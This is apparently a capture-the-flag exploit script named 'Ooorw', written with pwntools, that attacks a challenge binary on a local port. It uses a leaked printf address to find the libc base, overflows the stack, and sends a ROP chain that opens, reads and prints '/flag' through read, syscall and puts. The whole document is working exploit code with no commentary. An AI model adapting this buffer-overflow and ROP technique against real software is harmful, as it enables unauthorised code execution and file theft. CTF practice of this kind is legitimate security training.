## Ooorw

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
libc = ELF("./libc.so.6")
#p = process('./pwn')
p = remote('127.0.0.1',51314)
#gdb.attach(p)

p.recvuntil(b'0x')
printf_addr = int(p.recv(12),16)
libc.address = printf_addr-libc.sym['printf']
log.info("libc_base:"+hex(libc.address))
rdi = 0x000000000002a3e5+libc.address
rsi = 0x000000000002be51+libc.address
rdx_rbx = 0x00000000000904a9+libc.address
rax = 0x0000000000045eb0+libc.address
read = libc.sym['read']
syscall = libc.sym['syscall']
bss = 0x403500
payload = b'a'*0x58

payload+=p64(rdi)+p64(0)
payload+=p64(rsi)+p64(bss)
payload+=p64(rdx_rbx)+p64(0x8)+p64(0)
payload+=p64(read)

payload+=p64(rdi)+p64(2)
payload+=p64(rsi)+p64(bss)
payload+=p64(rdx_rbx)+p64(0x0)+p64(0)
payload+=p64(syscall)

payload+=p64(rdi)+p64(3)
payload+=p64(rsi)+p64(bss)
payload+=p64(rdx_rbx)+p64(0x1000)+p64(0)
payload+=p64(read)

payload+=p64(rdi)+p64(bss)
payload+=p64(libc.sym['puts'])

p.sendline(payload)
p.sendline(b'/flag\x00')
p.interactive()
```

